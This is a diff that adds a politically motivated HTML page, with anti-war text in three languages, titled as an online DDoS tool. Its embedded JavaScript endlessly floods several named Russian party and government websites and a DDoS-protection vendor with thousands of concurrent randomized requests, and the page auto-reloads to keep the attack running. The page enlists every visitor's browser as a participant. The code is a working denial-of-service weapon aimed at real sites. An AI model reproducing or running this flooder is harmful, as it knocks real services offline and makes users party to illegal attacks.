@@ -1,0 +1,154 @@
+﻿
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="utf-8" />
+    <title>Online DDOS tool - Russian warship, go fuck yourself</title>
+  </head>
+  <body>
+    <h1>UPDATED NEW LINKS - DDOS Script - Fuck the war</h1>
+    <table width="100%">
+      <tr>
+        <td width="30%">
+          <h3>English version</h3>
+          <p>Russia is spreading misinformation and lies throughout its state-controlled media, telling the populace it's in the name of freedom and unity. 
+            Meanwhile, Russian troops are committing widespread war crimes, attacking hospitals, children and ambulances.</p>
+          <p>This website contains a script that constantly floods Russian media, messaging, financial and government services with fake requests,
+             eventually causing these sites to crash.</p>
+          <p>Your web browser might begin to slow down, but this small contribution will help immensely to slow the Russian war effort and morale.</p>
+          <p>Stats for your current session can be found below. The number of requests is the number of times the website has been requested. The number of errors is how many times the website has failed to reply.</p>
+          <p>Slava Ukraini!</p>
+        </td>
+        <td width="30%">
+          <h3>Ukrainian - Українська версія</h3>
+          <p>Росія поширює дезінформацію та брехню у своїх контрольованих державою ЗМІ, розповідаючи населенню, що це в ім’я свободи та єдності. Тим часом російські війська вчиняють масові військові злочини, атакуючи лікарні, дітей та машини швидкої допомоги.</p>
+          <p>Цей веб-сайт містить сценарій, який постійно наповнює російські ЗМІ, повідомлення, фінансові та державні служби фальшивими запитами, що в кінцевому підсумку призводить до збою цих сайтів.</p>
+          <p>Ваш веб-браузер може почати гальмувати, але цей невеликий внесок надзвичайно допоможе уповільнити військові зусилля та моральний дух Росії.</p>
+          <p>Нижче наведено статистику поточної сесії. Кількість запитів – це кількість запитів на веб-сайт. Кількість помилок показує, скільки разів веб-сайт не відповів.</p>
+          <p>слава Україні</p>
+        </td>
+        <td width="30%">
+          <h3>Russian - Русская версия</h3>
+          <p>Россия распространяет дезинформацию и ложь через свои подконтрольные государству СМИ, говоря населению, что это во имя свободы и единства. Тем временем российские войска совершают широкомасштабные военные преступления, нападая на больницы, детей и машины скорой помощи.</p>
+          <p>Этот веб-сайт содержит скрипт, который постоянно наводняет российские СМИ, мессенджеры, финансовые и государственные службы поддельными запросами, что в конечном итоге приводит к сбою этих сайтов.</p>
+          <p>Статистику текущего сеанса можно найти ниже. Количество запросов — это количество запросов к веб-сайту. Количество ошибок — это количество раз, когда веб-сайт не ответил.</p>
+          <p>Ваш веб-браузер может начать работать медленнее, но этот небольшой вклад очень поможет замедлить боевой дух и боевой дух русских.</p>
+          <p>слава украине</p>
+        </td>
+      </tr>
+     </table>
+             <div id="stats">
+            <table width="90%">
+                <thead>
+                    <tr>
+                        <th>URL</th>
+                        <th>Number of Requests</th>
+                        <th>Number of Errors</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>https://er.ru/</td>
+                        <td>0</td>
+                        <td>0</td>
+                    </tr>
+                    <tr>
+                        <td>https://kprf.ru/</td>
+                        <td>0</td>
+                        <td>0</td>
+                    </tr>
+                    <tr>
+                        <td>https://ldpr.ru/</td>
+                        <td>0</td>
+                        <td>0</td>
+                    </tr>
+                    <tr>
+                        <td>http://www.spravedlivo.ru/</td>
+                        <td>0</td>
+                        <td>0</td>
+                    </tr>
+                    <tr>
+                        <td>https://tokyo.mid.ru/web/tokyo-ja</td>
+                        <td>0</td>
+                        <td>0</td>
+                    </tr>
+                    <tr>
+                        <td>https://ddos-guard.net/</td>
+                        <td>0</td>
+                        <td>0</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+  
+  <script>
+  var targets = [
+        'https://er.ru/',
+        'https://kprf.ru/',
+        'https://ldpr.ru/',
+        'http://www.spravedlivo.ru/',
+        'https://tokyo.mid.ru/web/tokyo-ja',
+        'https://ddos-guard.net/',
+  ]
+  
+  var targetStats = {}
+  targets.forEach((target) => {
+    targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0 }
+  })
+  
+  var statsEl = document.getElementById('stats');
+  function printStats() {
+    statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targetStats).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+  }
+  setInterval(printStats, 500);
+  
+  var CONCURRENCY_LIMIT = 2000;
+  var queue = []
+  
+  setTimeout("location.reload()",120000);
+  
+  async function fetchWithTimeout(resource, options) {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), options.timeout);
+    return fetch(resource, {
+      method: 'GET',
+      mode: 'no-cors',
+      signal: controller.signal
+    }).then((response) => {
+      clearTimeout(id);
+      return response;
+    }).catch((error) => {
+      clearTimeout(id);
+      throw error;
+    });
+  }
+  
+  async function flood(target) {
+    for (var i = 0;; ++i) {
+      if (queue.length > CONCURRENCY_LIMIT) {
+        await queue.shift()
+      }
+      rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
+      queue.push(
+        fetchWithTimeout(target+rand, { timeout: 1000 })
+          .catch((error) => {
+            if (error.code === 20 /* ABORT */) {
+              return;
+            }
+            targetStats[target].number_of_errored_responses++;
+          })
+          .then((response) => {
+            if (response && !response.ok) {
+              targetStats[target].number_of_errored_responses++;
+            }
+            targetStats[target].number_of_requests++;
+          })
+  
+      )
+    }
+  }
+  
+  // Start
+  targets.map(flood)
+  </script>
+</body>
